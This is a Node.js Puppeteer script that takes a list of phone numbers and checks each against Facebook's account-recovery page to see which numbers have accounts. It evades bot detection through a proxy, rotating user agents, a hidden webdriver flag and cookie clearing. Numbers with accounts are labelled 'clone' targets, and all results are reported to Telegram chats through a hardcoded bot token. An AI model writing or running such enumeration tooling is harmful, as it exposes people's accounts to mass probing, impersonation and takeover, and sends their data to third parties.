process.on("uncaughtException", (err) => {
    console.error("CRITICAL UNCATCHED EXCEPTION:", err);
});

process.on("unhandledRejection", (reason) => {
    console.error("CRITICAL UNHANDLED REJECTION:", reason);
});

const puppeteer = require("puppeteer-core");
const fs = require("fs");
const path = require("path");
const https = require("https");

const CHROMIUM_PATH = process.env.PUPPETEER_EXECUTABLE_PATH || "/usr/bin/chromium";

const NUMBERS_FILE = path.join(__dirname, "number.txt");
const PROXY_FILE = path.join(__dirname, "proxy.txt");

const TELEGRAM_BOT_TOKEN = "8964135275:AAGxRL8jjG9W8zIpORQdqheMOtyf9s2fBbE";
const CLONE_CHAT_ID = "-1003953361400";
const CREATE_CHAT_ID = "-1003949027870";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.83"
];

async function sendTelegramMessage(chatId, text) {
    if (!TELEGRAM_BOT_TOKEN) return;
    const data = JSON.stringify({ chat_id: chatId, text: text });
    const options = {
        hostname: 'api.telegram.org', port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    };
    return new Promise((resolve) => {
        const req = https.request(options, (res) => { res.on('data', () => {}); res.on('end', resolve); });
        req.on('error', () => { resolve(); });
        req.write(data);
        req.end();
    });
}

async function sendTelegramDocument(chatId, fileBuffer, fileName, caption) {
    if (!TELEGRAM_BOT_TOKEN) return;
    const boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    let body = [];
    body.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`));
    body.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`));
    body.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${fileName}"\r\nContent-Type: text/plain\r\n\r\n`));
    body.push(fileBuffer);
    body.push(Buffer.from(`\r\n--${boundary}--\r\n`));
    const payload = Buffer.concat(body);
    const options = {
        hostname: 'api.telegram.org', port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        method: 'POST',
        headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': payload.length }
    };
    return new Promise((resolve) => {
        const req = https.request(options, (res) => { res.on('data', () => {}); res.on('end', resolve); });
        req.on('error', () => { resolve(); });
        req.write(payload);
        req.end();
    });
}

function getNumbersList() {
    if (!fs.existsSync(NUMBERS_FILE)) {
        console.error("ERROR: number.txt file nahi mili!");
        process.exit(1);
    }
    const content = fs.readFileSync(NUMBERS_FILE, "utf-8");
    return content.split("\n").map(n => n.trim()).filter(n => n.length > 0);
}

function getProxyDetails() {
    if (!fs.existsSync(PROXY_FILE)) return null;
    const content = fs.readFileSync(PROXY_FILE, "utf-8").trim();
    const lines = content.split("\n").map(l => l.trim()).filter(l => l.length > 0);
    if (lines.length === 0) return null;
    const parts = lines[0].split(":");
    if (parts.length === 4) {
        return { host: parts[0].trim(), port: parts[1].trim(), username: parts[2].trim(), password: parts[3].trim() };
    }
    return null;
}

// Worker function for a single browser instance handling a specific slice of numbers
async function runWorker(workerId, numbersSlice) {
    if (numbersSlice.length === 0) return { cloneList: [], createList: [] };

    let cloneList = [];
    let createList = [];
    const proxy = getProxyDetails();

    const launchArgs = [
        "--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage",
        "--disable-gpu", "--disable-blink-features=AutomationControlled",
        "--window-size=1366,768", "--lang=en-US,en"
    ];

    if (proxy) {
        launchArgs.push(`--proxy-server=http://${proxy.host}:${proxy.port}`);
    }

    console.log(`🚀 [Worker ${workerId}] Launching Browser...`);
    const browser = await puppeteer.launch({
        executablePath: CHROMIUM_PATH,
        headless: true,
        args: launchArgs
    });

    const page = await browser.newPage();

    if (proxy && proxy.username && proxy.password) {
        await page.authenticate({ username: proxy.username, password: proxy.password });
    }

    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    });

    await page.setViewport({ width: 1366, height: 768 });
    const IDENTIFY_URL = "https://www.facebook.com/login/identify/";

    for (let i = 0; i < numbersSlice.length; i++) {
        const phoneNumber = numbersSlice[i];
        const randomUA = USER_AGENTS[(i + workerId) % USER_AGENTS.length];

        console.log(`\n[Worker ${workerId}] Processing -> ${phoneNumber}`);

        try {
            await page.setUserAgent(randomUA);
            await page.goto(IDENTIFY_URL, { waitUntil: "networkidle2", timeout: 60000 });
            await sleep(1500);

            const inputSelector = '#identify_email, input[name="email"], input[type="text"]';
            await page.waitForSelector(inputSelector, { visible: true, timeout: 20000 });

            await page.click(inputSelector);
            await page.evaluate((sel) => { document.querySelector(sel).value = ""; }, inputSelector);
            await page.type(inputSelector, phoneNumber, { delay: 100 });

            await Promise.all([
                page.keyboard.press("Enter"),
                page.waitForNavigation({ waitUntil: "networkidle2", timeout: 30000 }).catch(() => {})
            ]);

            await sleep(2000);
            const pageText = await page.evaluate(() => document.body.innerText);

            if (
                pageText.includes("No search results") ||
                pageText.includes("No account found") ||
                pageText.includes("Your search did not return any results") ||
                pageText.includes("We couldn't find an account")
            ) {
                console.log(`❌ [Worker ${workerId}] [${phoneNumber}] -> No Account Found.`);
                createList.push(phoneNumber);
                await sendTelegramMessage(CREATE_CHAT_ID, `❌ Create Account: ${phoneNumber}`);
            } else {
                console.log(`✅ [Worker ${workerId}] [${phoneNumber}] -> Account Found!`);
                cloneList.push(phoneNumber);
                await sendTelegramMessage(CLONE_CHAT_ID, `✅ Clone Account Found: ${phoneNumber}`);
            }

        } catch (err) {
            console.error(`[Worker ${workerId}] Error on ${phoneNumber}:`, err.message);
            createList.push(phoneNumber);
            await sendTelegramMessage(CREATE_CHAT_ID, `❌ Create Account: ${phoneNumber}`);
        } finally {
            try {
                const client = await page.target().createCDPSession();
                await client.send('Network.clearBrowserCookies');
                await client.send('Network.clearBrowserCache');
            } catch (e) {
                try {
                    const cookies = await page.cookies();
                    if (cookies.length > 0) await page.deleteCookie(...cookies);
                } catch(err2) {}
            }
        }
        await sleep(1000);
    }

    console.log(`🔒 [Worker ${workerId}] Closing Browser...`);
    await browser.close();
    return { cloneList, createList };
}

// Main Controller to run 2 workers in parallel
async function startBot() {
    const numbers = getNumbersList();
    console.log(`LOG: Total ${numbers.length} numbers loaded. Splitting into 2 parallel workers.`);

    // Split numbers array into 2 halves
    const midIndex = Math.ceil(numbers.length / 2);
    const worker1Numbers = numbers.slice(0, midIndex);
    const worker2Numbers = numbers.slice(midIndex);

    // Run both workers simultaneously using Promise.all
    const [result1, result2] = await Promise.all([
        runWorker(1, worker1Numbers),
        runWorker(2, worker2Numbers)
    ]);

    // Combine results
    const finalCloneList = [...result1.cloneList, ...result2.cloneList];
    const finalCreateList = [...result1.createList, ...result2.createList];

    console.log("\n======================================");
    console.log("LOG: Both processes complete! Sending final files...");
    console.log("======================================\n");

    if (finalCloneList.length > 0) {
        const cloneBuffer = Buffer.from(finalCloneList.join("\n"), "utf-8");
        await sendTelegramDocument(CLONE_CHAT_ID, cloneBuffer, "clone.txt", "📁 Final Clone Numbers List");
    }

    if (finalCreateList.length > 0) {
        const createBuffer = Buffer.from(finalCreateList.join("\n"), "utf-8");
        await sendTelegramDocument(CREATE_CHAT_ID, createBuffer, "create.txt", "📁 Final Create Numbers List");
    }
}

startBot();
